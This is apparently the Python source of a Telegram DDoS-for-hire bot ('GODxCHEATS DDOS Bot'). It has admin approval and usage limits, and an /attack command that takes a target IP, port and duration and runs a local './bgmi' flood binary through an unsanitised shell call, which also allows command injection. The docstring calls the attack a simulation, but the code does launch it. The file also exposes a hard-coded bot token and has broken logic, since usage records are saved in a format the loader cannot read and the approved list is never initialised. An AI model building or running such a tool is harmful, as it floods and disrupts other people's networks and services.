import asyncio
from telegram import Update, InputMediaPhoto
from telegram.ext import Application, CommandHandler, CallbackContext
import os
import time

# Configuration
TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"
ADMIN_USER_ID = 1662672529  # Replace with your admin user ID
APPROVED_IDS_FILE = 'approved_ids.txt'
USER_USAGE_FILE = 'user_usage.txt'
CHANNEL_ID = "@jsbananannanan"  # Replace with your channel username
attack_in_progress = False
user_usage = {}
user_limits = {}

# Check if the token is set
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")

# Load and Save Functions for Approved IDs and User Data
def load_approved_ids():
    """Load approved user and group IDs from a file."""
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return {line.strip() for line in file.readlines()}
    except FileNotFoundError:
        return set()

def save_approved_ids():
    """Save approved user and group IDs to a file."""
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

def load_user_usage():
    """Load user usage statistics."""
    try:
        with open(USER_USAGE_FILE, 'r') as file:
            return {line.split()[0]: int(line.split()[1]) for line in file.readlines()}
    except FileNotFoundError:
        return {}

def save_user_usage():
    """Save user usage statistics."""
    with open(USER_USAGE_FILE, 'w') as file:
        for user_id, count in user_usage.items():
            file.write(f"{user_id} {count}\n")

# Helper Functions
async def is_admin(chat_id):
    """Check if the user is the admin."""
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    """Check if the user is a member of the specified channel."""
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

async def user_usage_limit_reached(user_id):
    """Check if the user has exceeded the usage limit for the day."""
    current_time = time.time()
    if user_id not in user_usage:
        user_usage[user_id] = {'count': 0, 'last_reset': current_time}
        save_user_usage()
    if current_time - user_usage[user_id]['last_reset'] > 86400:  # 24 hours in seconds
        user_usage[user_id]['count'] = 0  # Reset count every 24 hours
        user_usage[user_id]['last_reset'] = current_time
        save_user_usage()
    return user_usage[user_id]['count'] >= 5  # Max 5 uses per day

# Commands
async def start(update: Update, context: CallbackContext):
    """Send a welcome message to the user with an image."""
    chat_id = update.effective_chat.id
    username = update.effective_user.username
    message = (
        f"*Welcome, @{username} to GODxCHEATS DDOS Bot!*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands."
    )
    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your actual image URL
    await context.bot.send_photo(chat_id=chat_id, photo=image_url, caption=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    """Send a list of available commands and their usage."""
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n"
        "/help - Show this help message.\n"
        "/approve <id> - Approve a user or group ID (admin only).\n"
        "/remove <id> - Remove a user or group ID (admin only).\n"
        "/setlimit <limit> - Set the maximum number of bot uses per user (admin only).\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
        "/details - Show user statistics (admin only).\n"
        "/setcooldown <seconds> - Set cooldown time after each attack (admin only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def details(update: Update, context: CallbackContext):
    """Show user statistics (admin only)."""
    chat_id = update.effective_chat.id

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    total_approved = len(approved_ids)
    total_users = len(user_usage)
    message = (
        f"*User Statistics:*\n\n"
        f"Total Approved IDs: {total_approved}\n"
        f"Total Registered Users: {total_users}\n"
        "\nUse /help for more details on commands."
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def setlimit(update: Update, context: CallbackContext):
    """Set the limit for bot usage."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /setlimit <limit>*", parse_mode='Markdown')
        return

    limit = int(args[0])
    user_limits['limit'] = limit  # Store globally for now
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Bot usage limit set to {limit} per user per day.*", parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    """Approve a user or group/chat ID."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <chat_id>*", parse_mode='Markdown')
        return

    target_id = args[0]
    approved_ids.add(target_id)
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Chat ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    """Remove a user or group/chat ID from the approved list."""
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <chat_id>*", parse_mode='Markdown')
        return

    target_id = args[0]
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Chat ID {target_id} has been removed from the approved list.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Chat ID {target_id} not found in the approved list.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    """Launch an attack if the user is approved and within the limits."""
    global attack_in_progress
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if await user_usage_limit_reached(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have exceeded the daily usage limit.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ Attack initiated by @{update.effective_user.username}*\n\n"
        f"*🎯 Target IP:* {ip}\n"
        f"*🔌 Port:* {port}\n"
        f"*⏱ Duration:* {time} seconds\n"
        "*[https://t.me/jwhu7hwbsnn/122]*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

async def run_attack(chat_id, ip, port, time, context):
    """Simulate an attack process."""
    global attack_in_progress
    attack_in_progress = True

    try:
        # Simulate attack
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*💥 Attack finished!*\n[Feedback link here].", parse_mode='Markdown')

# Main Function
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("details", details))
    application.add_handler(CommandHandler("setlimit", setlimit))

    application.run_polling()

if __name__ == '__main__':
    main()
